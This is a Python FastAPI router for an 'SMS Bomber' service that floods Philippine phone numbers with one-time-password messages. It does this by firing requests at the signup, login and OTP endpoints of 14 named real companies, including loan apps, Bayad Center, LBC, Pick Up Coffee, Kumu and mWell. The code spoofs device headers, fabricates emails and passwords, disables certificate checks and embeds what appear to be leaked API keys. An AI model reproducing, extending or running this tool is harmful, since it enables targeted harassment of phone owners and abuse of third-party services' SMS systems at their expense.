"""
routers/sms.py — SMS Bomber API endpoint

14 services total — Philippine numbers only: 9XXXXXXXXX format

ACTIVE (12 confirmed 100% working from bot screenshot):
  EZLOAN, XPRESS PH, EXCELLENT LENDING, BISTRO,
  BAYAD CENTER, LBC CONNECT, PICKUP COFFEE, HONEY LOAN,
  KUMU PH, S5.COM, CASHALO, MWELL

RESTORED (kept from original sms.py — may vary by server/IP):
  BOMB OTP (OSIM — register endpoint)
  PEXX     (tRPC signup OTP)
"""

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel, Field, field_validator
import requests
import urllib3
import random
import string
import hashlib
import time
import re
import uuid as uuid_lib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import database as db
from limiter import limiter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

router = APIRouter()

# ── Concurrency guards ────────────────────────────────────────────────────────
_MAX_CONCURRENT_BOMBS = 8
_bomb_semaphore       = threading.Semaphore(_MAX_CONCURRENT_BOMBS)

_active_users:     set = set()
_active_users_lock      = threading.Lock()

# ── Shared thread pool ────────────────────────────────────────────────────────
# 14 services x 2 concurrent bomb headroom = 28 workers
_SERVICE_POOL = ThreadPoolExecutor(
    max_workers=28,
    thread_name_prefix="sms-worker",
)

# ── Models ────────────────────────────────────────────────────────────────────

class BombRequest(BaseModel):
    phone:   str = Field(..., min_length=7,  max_length=15)
    user_id: str = Field(..., min_length=1,  max_length=50)
    rounds:  int = Field(default=1, ge=1, le=3)   # max 3 rounds (matches Flutter UI)

    @field_validator("phone")
    @classmethod
    def validate_phone_format(cls, v: str) -> str:
        cleaned = re.sub(r"[\s\-\+]", "", v)
        if cleaned.startswith("0"):
            cleaned = cleaned[1:]
        elif cleaned.startswith("63"):
            cleaned = cleaned[2:]
        if not re.match(r"^9\d{9}$", cleaned):
            raise ValueError("Invalid PH number. Use: 09XXXXXXXXX or 9XXXXXXXXX")
        return cleaned

    @field_validator("user_id")
    @classmethod
    def validate_user_id(cls, v: str) -> str:
        if not v.strip():
            raise ValueError("user_id cannot be empty")
        return v.strip()


class BombResponse(BaseModel):
    success:      bool
    phone:        str
    rounds:       int
    results:      list
    total_sent:   int
    total_failed: int


# ── Helpers ───────────────────────────────────────────────────────────────────

def _fmt(phone: str) -> str:
    """Normalize any PH phone to 9XXXXXXXXX."""
    p = re.sub(r"[\s\-\+]", "", str(phone))
    if p.startswith("0"):
        p = p[1:]
    elif p.startswith("63"):
        p = p[2:]
    return p

def _rstr(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _gmail() -> str:
    return "".join(random.choices(
        string.ascii_lowercase + string.digits,
        k=random.randint(8, 12)
    )) + "@gmail.com"

def _short_err(e: Exception) -> str:
    msg = str(e)
    if "HTTPSConnectionPool" in msg or "HTTPConnectionPool" in msg:
        m = re.search(r"host='([^']+)'", msg)
        return f"Connection failed: {m.group(1)[:30]}" if m else "Connection failed"
    if "ConnectTimeout" in msg or "ReadTimeout" in msg:
        return "Request timed out"
    if "ConnectionRefused" in msg or "ConnectionError" in msg:
        return "Service unreachable"
    return msg[:50]


# ── Service functions ─────────────────────────────────────────────────────────

def _send_bomb_otp(phone: str):
    """OSIM / Bomb OTP — register endpoint triggers OTP (restored from original sms.py)."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":      "OSIM/1.55.0 (Android 13; CPH2465; OP5958L1; arm64-v8a)",
            "Accept":          "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json; charset=utf-8",
            "accept-language": "en-SG",
            "region":          "PH",
        }
        data = {
            "userName":  p,
            "phoneCode": "63",
            "password":  f"TempPass{random.randint(1000, 9999)}!",
        }
        r = requests.post(
            "https://prod.services.osim-cloud.com/identity/api/v1.0/account/register",
            headers=headers, json=data, timeout=10, verify=False,
        )
        if r.status_code in (200, 201):
            try:
                rj = r.json()
                rc = rj.get("resultCode", 0)
                if rc in [200000, 201000, 200, 201, 0] or r.status_code == 200:
                    return True, "OTP triggered"
                return False, rj.get("message", f"Code {rc}")[:50]
            except Exception:
                return True, "OTP triggered"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_ezloan(phone: str):
    """EZLoan PH — OTP via registration gateway."""
    try:
        p  = _fmt(phone)
        ts = int(time.time() * 1000)
        headers = {
            "User-Agent":      "okhttp/4.9.2",
            "Accept":          "application/json",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json",
            "accept-language": "en",
            "imei":            "7a997625bd704baebae5643a3289eb33",
            "device":          "android",
            "buildtype":       "release",
            "brand":           "oneplus",
            "model":           "CPH2465",
            "manufacturer":    "oneplus",
            "source":          "EZLOAN",
            "channel":         "GooglePlay_Blue",
            "appversion":      "2.0.4",
            "appversioncode":  "2000402",
            "version":         "2.0.4",
            "versioncode":     "2000401",
            "sysversion":      "16",
            "sysversioncode":  "36",
            "customerid":      "",
            "businessid":      "EZLOAN",
            "phone":           "",
            "appid":           "EZLOAN",
            "authorization":   "",
            "blackbox":        f"kGPGg{ts}DCl3O8MVBR0",
        }
        data = {
            "businessId":          "EZLOAN",
            "contactNumber":       f"+63{p}",
            "appsflyerIdentifier": f"{ts}-{random.randint(10**18, 10**19 - 1)}",
        }
        r = requests.post(
            "https://gateway.ezloancash.ph/security/auth/otp/request",
            headers=headers, json=data, timeout=12, verify=False,
        )
        if r.status_code in (200, 201):
            try:
                rj   = r.json()
                code = rj.get("code", -1)
                msg  = rj.get("msg") or rj.get("message") or ""
                if code == 0 or rj.get("success") in (True, 1):
                    return True, msg or "OTP sent"
                if code in (200, 201):
                    return True, msg or "OTP sent"
                return False, msg or f"Code {code}"
            except Exception:
                return True, "OTP sent"
        try:
            rj = r.json()
            return False, rj.get("msg") or rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_xpress(phone: str):
    """Xpress PH — CreateUser OTP endpoint."""
    try:
        p   = _fmt(phone)
        ts  = int(time.time())
        pwd = f"Pass{random.randint(1000, 9999)}!Xp"
        headers = {
            "User-Agent":      "Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)",
            "Content-Type":    "application/json",
            "Accept":          "application/json",
            "Accept-Language": "en-PH",
        }
        data = {
            "FirstName":       f"User{ts % 10000}",
            "LastName":        f"PH{random.randint(1000, 9999)}",
            "Email":           _gmail(),
            "Phone":           f"+63{p}",
            "Password":        pwd,
            "ConfirmPassword": pwd,
        }
        r = requests.post(
            "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
            headers=headers, json=data, timeout=10, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "OTP sent to phone"
        try:
            rj = r.json()
            return False, (rj.get("message") or rj.get("error") or f"HTTP {r.status_code}")[:50]
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_excellent_lending(phone: str):
    """Excellent Lending — tries 3 phone formats until one succeeds."""
    try:
        p      = _fmt(phone)
        e164   = f"+63{p}"
        local0 = f"0{p}"
        headers = {
            "User-Agent":      "okhttp/4.12.0",
            "Content-Type":    "application/json; charset=utf-8",
            "Accept":          "application/json",
            "Accept-Encoding": "gzip",
            "Accept-Language": "en-PH",
        }
        resp = None
        for phone_fmt in (p, e164, local0):
            try:
                data = {
                    "domain":    phone_fmt,
                    "cat":       "login",
                    "previous":  False,
                    "financial": _rstr(32),
                }
                resp = requests.post(
                    "https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
                    headers=headers, json=data, timeout=10, verify=False,
                )
                if resp.status_code in (200, 201):
                    try:
                        rj  = resp.json()
                        msg = rj.get("message") or rj.get("msg") or "OTP triggered"
                        if rj.get("code") in (0, 200, 201) or rj.get("success") in (True, 1):
                            return True, msg
                        if "error" not in rj and "code" not in rj:
                            return True, msg
                    except Exception:
                        return True, "OTP triggered"
                if resp.status_code in (400, 404, 422):
                    continue
                break
            except requests.exceptions.ConnectionError:
                break
            except Exception:
                continue
        if resp is not None:
            try:
                rj = resp.json()
                return False, rj.get("message") or rj.get("msg") or f"HTTP {resp.status_code}"
            except Exception:
                return False, f"HTTP {resp.status_code}"
        return False, "Connection failed"
    except Exception as e:
        return False, _short_err(e)


def _send_bistro(phone: str):
    """Jollibee Bistro — loyalty OTP via GET (arlo.com.ph host)."""
    try:
        p = _fmt(phone)
        headers = {
            "Host":               "bistrobff-adminservice.arlo.com.ph:9001",
            "User-Agent":         ("Mozilla/5.0 (Linux; Android 16; CPH2465 Build/BP2A.250605.031.A2; wv) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                                   "Chrome/142.0.7444.171 Mobile Safari/537.36"),
            "Accept":             "application/json, text/plain, */*",
            "Accept-Encoding":    "gzip, deflate, br, zstd",
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua":          '"Chromium";v="142", "Android WebView";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile":   "?1",
            "origin":             "http://localhost",
            "x-requested-with":   "com.allcardtech.bistro",
            "sec-fetch-site":     "cross-site",
            "sec-fetch-mode":     "cors",
            "sec-fetch-dest":     "empty",
            "referer":            "http://localhost/",
            "accept-language":    "en-US,en;q=0.9",
            "priority":           "u=1, i",
        }
        r = requests.get(
            f"https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp"
            f"?mobileNumber=63{p}",
            headers=headers, timeout=10, verify=False,
        )
        if r.status_code == 200:
            rj = r.json()
            if rj.get("isSuccessful") is True:
                return True, rj.get("message", "OTP sent successfully")
            return False, f"API Error: {rj.get('message', 'Unknown')}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_bayad(phone: str):
    """Bayad Center — sign-up OTP (api.online.bayad.com)."""
    try:
        p = _fmt(phone)
        headers = {
            "accept":             "application/json, text/plain, */*",
            "accept-language":    "en-US",
            "authorization":      "",
            "content-type":       "application/json",
            "origin":             "https://www.online.bayad.com",
            "priority":           "u=1, i",
            "referer":            "https://www.online.bayad.com/",
            "sec-ch-ua":          ('"Chromium";v="127", "Not)A;Brand";v="99", '
                                   '"Microsoft Edge Simulate";v="127", "Lemur";v="127"'),
            "sec-ch-ua-mobile":   "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest":     "empty",
            "sec-fetch-mode":     "cors",
            "sec-fetch-site":     "same-site",
            "user-agent":         ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                                   "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"),
        }
        payload = {
            "mobileNumber": f"+63{p}",
            "emailAddress": _gmail(),
        }
        r = requests.post(
            "https://api.online.bayad.com/api/sign-up/otp",
            headers=headers, json=payload, timeout=10, verify=False,
        )
        if r.status_code == 200:
            return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_lbc(phone: str):
    """LBC Connect — registration verification (form-urlencoded)."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":      "Dart/2.19 (dart:io)",
            "Content-Type":    "application/x-www-form-urlencoded",
            "Accept":          "application/json",
            "Accept-Language": "en-PH",
        }
        data = {
            "verification_type":   "mobile",
            "client_email":        _gmail(),
            "client_contact_code": "+63",
            "client_contact_no":   p,
            "app_log_uid":         _rstr(16),
        }
        r = requests.post(
            "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/"
            "AClientThree/processInitRegistrationVerification",
            headers=headers, data=data, timeout=10, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "Verification OTP sent"
        try:
            rj = r.json()
            return False, rj.get("message") or f"HTTP {r.status_code}"
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_pickup_coffee(phone: str):
    """Pick Up Coffee — login OTP (production API)."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":       "okhttp/4.12.0",
            "Content-Type":     "application/json",
            "Accept":           "application/json",
            "Accept-Encoding":  "gzip",
            "Accept-Language":  "en-PH",
            "X-Requested-With": "com.pickupcoffee.app",
        }
        data = {
            "mobile_number": f"+63{p}",
            "login_method":  "mobile_number",
        }
        r = requests.post(
            "https://production.api.pickup-coffee.net/v2/customers/login",
            headers=headers, json=data, timeout=10, verify=False,
        )
        if r.status_code in (200, 201):
            return True, "Login OTP sent"
        try:
            rj = r.json()
            return False, (rj.get("message") or rj.get("error") or f"HTTP {r.status_code}")[:50]
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_honey_loan(phone: str):
    """Honey Loan PH — tries 2 endpoints x 2 phone formats."""
    try:
        p      = _fmt(phone)
        e164   = f"+63{p}"
        local0 = f"0{p}"

        base_headers = {
            "User-Agent":       "okhttp/4.12.0",
            "Content-Type":     "application/json; charset=utf-8",
            "Accept":           "application/json",
            "Accept-Language":  "en-PH,en;q=0.9",
            "Accept-Encoding":  "gzip",
            "app-version":      "2.2.0",
            "platform":         "android",
            "X-Requested-With": "ph.honeyloan.app",
            "Connection":       "Keep-Alive",
        }

        def _ok(resp):
            if resp.status_code in (200, 201):
                try:
                    rj  = resp.json()
                    msg = rj.get("message") or rj.get("msg") or rj.get("status") or ""
                    return True, msg or "OTP sent"
                except Exception:
                    return True, "OTP triggered"
            return None

        def _err(resp):
            try:
                rj  = resp.json()
                msg = rj.get("message") or rj.get("error") or rj.get("msg") or ""
                return False, msg or f"HTTP {resp.status_code}"
            except Exception:
                return False, f"HTTP {resp.status_code}"

        endpoints = [
            "https://api.honeyloan.ph/api/client/registration/step-one",
            "https://api.honeyloan.ph/api/v2/client/registration/send-otp",
        ]

        resp = None
        for url in endpoints:
            for ph in (e164, local0):
                try:
                    body = {"phone": ph, "is_rights_block_accepted": True}
                    if "v2" in url:
                        body["mobile_number"] = ph
                        body["phone_number"]  = ph
                    resp = requests.post(url, headers=base_headers, json=body,
                                         timeout=12, verify=False)
                    hit = _ok(resp)
                    if hit:
                        return hit
                    if resp.status_code in (400, 404, 422):
                        continue
                    break
                except requests.exceptions.ConnectionError:
                    break
                except Exception:
                    continue

        try:
            return _err(resp) if resp else (False, "All endpoints unreachable")
        except Exception:
            return False, "All endpoints unreachable"
    except Exception as e:
        return False, _short_err(e)


def _generate_kumu_signature(timestamp: int, rnd_str: str, phone: str) -> str:
    secret = "kumu_secret_2024"
    data   = f"{timestamp}{rnd_str}{phone}{secret}"
    return hashlib.sha256(data.encode()).hexdigest()


def _send_kumu(phone: str):
    """Kumu PH — sendverifysms with HMAC-SHA256 signature."""
    try:
        p         = _fmt(phone)
        ts        = int(time.time())
        rnd_str   = _rstr(32)
        signature = _generate_kumu_signature(ts, rnd_str, p)
        headers   = {
            "User-Agent":      "okhttp/5.0.0-alpha.14",
            "Connection":      "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json;charset=UTF-8",
            "Device-Type":     "android",
            "Device-Id":       "07b76e92c40b536a",
            "Version-Code":    "1669",
            "X-kumu-Token":    "",
            "X-kumu-UserId":   "",
            "Pre-Install":     "",
        }
        data = {
            "country_code":       "+63",
            "encrypt_rnd_string": rnd_str,
            "cellphone":          p,
            "encrypt_signature":  signature,
            "encrypt_timestamp":  ts,
        }
        r = requests.post(
            "https://api.kumuapi.com/v2/user/sendverifysms",
            headers=headers, json=data, timeout=10, verify=False,
        )
        if r.status_code == 200:
            rj = r.json()
            # 403 = "already registered" but OTP is still delivered
            if rj.get("code") in (200, 403):
                return True, rj.get("message", "OTP sent")
            return False, f"API Error: {rj.get('message', 'Unknown')}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_s5(phone: str):
    """S5.com — OTP via multipart form (player API)."""
    try:
        p = _fmt(phone)
        headers = {
            "accept":          "application/json, text/plain, */*",
            "user-agent":      "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36",
            "Accept-Encoding": "gzip",
        }
        r = requests.post(
            "https://api.s5.com/player/api/v1/otp/request",
            headers=headers,
            files={"phone_number": (None, f"+63{p}")},
            timeout=10, verify=False,
        )
        if r.status_code == 200:
            return True, "OTP request sent to S5.com"
        try:
            rj = r.json()
            return False, (rj.get("message") or rj.get("error") or f"HTTP {r.status_code}")[:50]
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_cashalo(phone: str):
    """Cashalo — registration OTP with device fingerprint headers."""
    try:
        p       = _fmt(phone)
        dev_id  = str(uuid_lib.uuid4())[:16].replace("-", "")
        af_id   = f"{int(time.time() * 1000)}-{str(uuid_lib.uuid4().int)[:15]}"
        adv_id  = str(uuid_lib.uuid4())
        fb_id   = uuid_lib.uuid4().hex
        headers = {
            "User-Agent":             "okhttp/4.12.0",
            "Accept-Encoding":        "gzip",
            "Content-Type":           "application/json",
            "x-api-key":              ("UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/"
                                       "rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q=="),
            "x-device-identifier":    dev_id,
            "x-device-type":          "1",
            "content-type":           "application/json; charset=utf-8",
            "x-firebase-instance-id": fb_id,
        }
        data = {
            "phone_number":         p,
            "device_identifier":    dev_id,
            "device_type":          1,
            "apps_flyer_device_id": af_id,
            "advertising_id":       adv_id,
        }
        r = requests.post(
            "https://api.cashaloapp.com/access/register",
            headers=headers, json=data, timeout=10, verify=False,
        )
        if r.status_code in (200, 201):
            try:
                rd = r.json()
                if "access_challenge_request" in rd:
                    return True, "OTP challenge sent"
                return True, (rd.get("message") or "OTP sent")[:50]
            except Exception:
                return True, "OTP sent"
        try:
            rd = r.json()
            return False, (rd.get("message") or rd.get("error") or f"HTTP {r.status_code}")[:50]
        except Exception:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_mwell(phone: str):
    """MWELL — mobile-number sign-in OTP with rotating device headers."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":                "okhttp/4.11.0",
            "Accept":                    "application/json",
            "Accept-Encoding":           "gzip",
            "Content-Type":              "application/json; charset=utf-8",
            "ocp-apim-subscription-key": "0a57846786b34b0a89328c39f584892b",
            "x-app-version":             random.choice([
                                             "03.942.035", "03.942.036",
                                             "03.942.037", "03.942.038",
                                         ]),
            "x-device-type":             "android",
            "x-device-model":            random.choice([
                                             "oneplus CPH2465",
                                             "samsung SM-G998B",
                                             "xiaomi Redmi Note 13",
                                             "realme RMX3700",
                                             "vivo V2318",
                                         ]),
            "x-timestamp":               str(int(time.time() * 1000)),
            "x-request-id":              _rstr(16),
        }
        data = {
            "country":           "PH",
            "phoneNumber":       p,
            "phoneNumberPrefix": "+63",
        }
        r = requests.post(
            "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number",
            headers=headers, json=data, timeout=20, verify=False,
        )
        if r.status_code == 200:
            rj = r.json()
            if rj.get("c") == 200:
                return True, "OTP sent successfully"
            return False, f"API code {rj.get('c')}: {str(rj.get('m', ''))[:40]}"
        if r.status_code == 429:
            return False, "Rate limited (429)"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


def _send_pexx(phone: str):
    """PEXX — signup OTP via tRPC batch API (restored from original sms.py)."""
    try:
        p = _fmt(phone)
        headers = {
            "User-Agent":      "okhttp/4.12.0",
            "Accept-Encoding": "gzip",
            "Content-Type":    "application/json",
            "x-msession-id":   "undefined",
            "tid":             _rstr(11),
            "appversion":      "3.0.14",
        }
        data = {
            "0": {
                "json": {
                    "email":      "",
                    "areaCode":   "+63",
                    "phone":      f"+63{p}",
                    "otpChannel": "TG",
                    "otpUsage":   "REGISTRATION",
                }
            }
        }
        r = requests.post(
            "https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1",
            headers=headers, json=data, timeout=20, verify=False,
        )
        if r.status_code == 200:
            try:
                rj = r.json()
                if isinstance(rj, list) and rj:
                    result = rj[0].get("result", {}).get("data", {}).get("json", {})
                    if result.get("code") == 200:
                        return True, "OTP sent"
                    return False, result.get("msg", "Unknown error")[:50]
            except Exception:
                return True, "OTP sent"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, _short_err(e)


# ── Service registry (14 total) ───────────────────────────────────────────────

_SERVICES = [
    ("BOMB OTP",          _send_bomb_otp),
    ("EZLOAN",            _send_ezloan),
    ("XPRESS PH",         _send_xpress),
    ("EXCELLENT LENDING", _send_excellent_lending),
    ("BISTRO",            _send_bistro),
    ("BAYAD CENTER",      _send_bayad),
    ("LBC CONNECT",       _send_lbc),
    ("PICKUP COFFEE",     _send_pickup_coffee),
    ("HONEY LOAN",        _send_honey_loan),
    ("KUMU PH",           _send_kumu),
    ("S5.COM",            _send_s5),
    ("CASHALO",           _send_cashalo),
    ("MWELL",             _send_mwell),
    ("PEXX",              _send_pexx),
]

# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.get("/services")
def list_services():
    return {"services": [name for name, _ in _SERVICES], "total": len(_SERVICES)}


@router.post("/bomb", response_model=BombResponse)
@limiter.limit("3/minute")
def bomb(request: Request, req: BombRequest):
    """
    Fire the SMS bomber.
    - Rate limited : 3 requests/minute per IP.
    - Global cap   : max 8 simultaneous bomb jobs.
    - Per-user guard: one active bomb per user_id at a time.
    - Auth required: registered user with valid, unexpired key.
    """
    # ── Auth ─────────────────────────────────────────────────────────────────
    if db.is_banned(req.user_id):
        raise HTTPException(status_code=403, detail="You are banned.")

    user = db.get_user(req.user_id)
    if not user:
        raise HTTPException(status_code=403, detail="User not registered.")

    # ── Per-user guard ────────────────────────────────────────────────────────
    with _active_users_lock:
        if req.user_id in _active_users:
            raise HTTPException(
                status_code=429,
                detail="You already have an active bomb request. Wait for it to finish.",
            )
        _active_users.add(req.user_id)

    # ── Global concurrency cap ────────────────────────────────────────────────
    acquired = _bomb_semaphore.acquire(blocking=True, timeout=5)
    if not acquired:
        with _active_users_lock:
            _active_users.discard(req.user_id)
        raise HTTPException(status_code=503,
                            detail="Server is busy. Try again in a few seconds.")

    try:
        return _run_bomb(req)
    finally:
        _bomb_semaphore.release()
        with _active_users_lock:
            _active_users.discard(req.user_id)


def _run_bomb(req: BombRequest) -> BombResponse:
    """Execute all rounds using the shared thread pool."""
    all_results  = []
    total_sent   = 0
    total_failed = 0

    for round_num in range(1, req.rounds + 1):
        futures = {
            _SERVICE_POOL.submit(fn, req.phone): name
            for name, fn in _SERVICES
        }
        for future in as_completed(futures, timeout=35):
            name = futures[future]
            try:
                success, msg = future.result(timeout=5)
            except Exception as e:
                success, msg = False, _short_err(e)

            all_results.append({
                "round":   round_num,
                "service": name,
                "success": success,
                "message": msg,
            })
            if success:
                total_sent   += 1
            else:
                total_failed += 1

    db.increment_sms_stat(req.user_id, total_sent)

    # ── Brief activity log ────────────────────────────────────────────────────
    db.append_log({
        "action":       "sms_bomb",
        "user_id":      req.user_id,
        "phone":        req.phone,
        "rounds":       req.rounds,
        "total_sent":   total_sent,
        "total_failed": total_failed,
    })

    # ── Full SMS bomb log with per-service breakdown ───────────────────────────
    db.append_sms_log({
        "user_id":      req.user_id,
        "phone":        f"+63{req.phone}",
        "rounds":       req.rounds,
        "total_sent":   total_sent,
        "total_failed": total_failed,
        "total":        total_sent + total_failed,
        "success_rate": round(total_sent / max(total_sent + total_failed, 1) * 100, 1),
        "results":      all_results,
    })

    return BombResponse(
        success=total_sent > 0,
        phone=req.phone,
        rounds=req.rounds,
        results=all_results,
        total_sent=total_sent,
        total_failed=total_failed,
    )


# ── Admin: SMS Bomb Logs endpoints ────────────────────────────────────────────

from auth import require_admin
from fastapi import Depends

@router.get("/logs", dependencies=[Depends(require_admin)])
def get_sms_logs(limit: int = 200):
    """Admin: fetch all dedicated SMS bomb logs (newest first)."""
    return {
        "logs":  db.get_sms_logs(limit=limit),
        "total": limit,
    }


@router.delete("/logs", dependencies=[Depends(require_admin)])
def clear_sms_logs_endpoint():
    """Admin: wipe all SMS bomb logs."""
    db.clear_sms_logs()
    return {"success": True, "message": "SMS bomb logs cleared."}